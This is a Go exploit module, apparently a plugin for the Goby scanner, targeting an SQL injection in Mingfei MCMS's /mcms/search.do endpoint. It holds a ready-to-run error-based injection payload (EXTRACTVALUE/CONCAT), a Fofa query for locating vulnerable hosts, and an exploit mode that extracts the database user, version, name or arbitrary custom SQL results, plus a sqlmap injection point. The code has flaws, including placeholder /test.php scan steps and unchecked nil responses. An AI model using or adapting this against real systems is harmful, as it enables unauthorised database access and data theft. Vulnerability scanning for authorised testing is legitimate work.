package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mingfei CMS /mcms/search.do SQL Injection Vulnerability",
    "Description": "<p>The Mingfei CMS /mcms/search.do interface has an SQL injection vulnerability, allowing attackers to send malicious SQL statements to the database, potentially leading to database information disclosure or data tampering.</p>",
    "Product": "MCMS",
    "Homepage": "https://www.mingsoft.net/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-11-18",
    "Author": "2826161446@qq.com",
    "FofaQuery": "title=\"铭飞MCMS\" && body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\"",
    "GobyQuery": "title=\"铭飞MCMS\" && body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the SQL injection vulnerability to send malicious SQL statements to the database, potentially leading to database information disclosure or data tampering.</p>",
    "Recommendation": "<p>1. Pay attention to the latest news from manufacturers and update to the latest version in time: <a href=\"https://www.mingsoft.net/\">https://www.mingsoft.net/</a></p><p>2. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod   </p><p>3.Verify the value entered by the user</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E9%93%AD%E9%A3%9E/%E9%93%AD%E9%A3%9ECMS-search%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "user()",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "user(),version(),database()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "铭飞CMS /mcms/search.do SQL 注入漏洞",
            "Product": "铭飞/MCMS",
            "Description": "<p>铭飞CMS /mcms/search.do 接口存在SQL注入漏洞，攻击者可以通过该漏洞向数据库发送恶意SQL语句，可能导致数据库信息泄露或数据被篡改。</p>",
            "Recommendation": "<p>1.关注厂商最新消息，及时更新到最新版本：<a href=\"https://www.mingsoft.net/\">https://www.mingsoft.net/</a></p><p>2.减少使用或不使用字符串拼接的方式执行SQL，而是将用户输入当着参数传给执行SQL的方法&nbsp;</p><p>3.对用户输入的值进行校验<br></p>",
            "Impact": "<p>攻击者可以通过SQL注入漏洞向数据库发送恶意SQL语句，可能导致数据库信息泄露或数据被篡改。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Mingfei CMS /mcms/search.do SQL Injection Vulnerability",
            "Product": "MCMS",
            "Description": "<p>The Mingfei CMS /mcms/search.do interface has an SQL injection vulnerability, allowing attackers to send malicious SQL statements to the database, potentially leading to database information disclosure or data tampering.</p>",
            "Recommendation": "<p>1. Pay attention to the latest news from manufacturers and update to the latest version in time:&nbsp;<a href=\"https://www.mingsoft.net/\">https://www.mingsoft.net/</a><br></p><p>2. Reduce or avoid string concatenation toexecute SQL, and instead pass user input as a parameter to the SQL executionmethod &nbsp;&nbsp;</p><p>3.Verify the value entered by the user<br></p>",
            "Impact": "<p>Attackers can exploit the SQL injection vulnerability to send malicious SQL statements to the database, potentially leading to database information disclosure or data tampering.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}

		rawPayload := fmt.Sprintf("/mcms/search.do' AND EXTRACTVALUE(5225,CONCAT(0x5c,%s,user(),0x71767a7071)) AND 'smmD'='smmD=1", sql)
		urlget := rawPayload
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/mcms/search.do"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			content := hex.EncodeToString(MD5Hash.Sum(nil))[0:16]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "MD5(" + MD5ResultStr + ")"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `<td align="left">([\s\S]*)<\/td>`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "/mcms/search.do* HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept-Encoding: gzip, deflate\n\n"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `XPATH syntax error: '\\([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
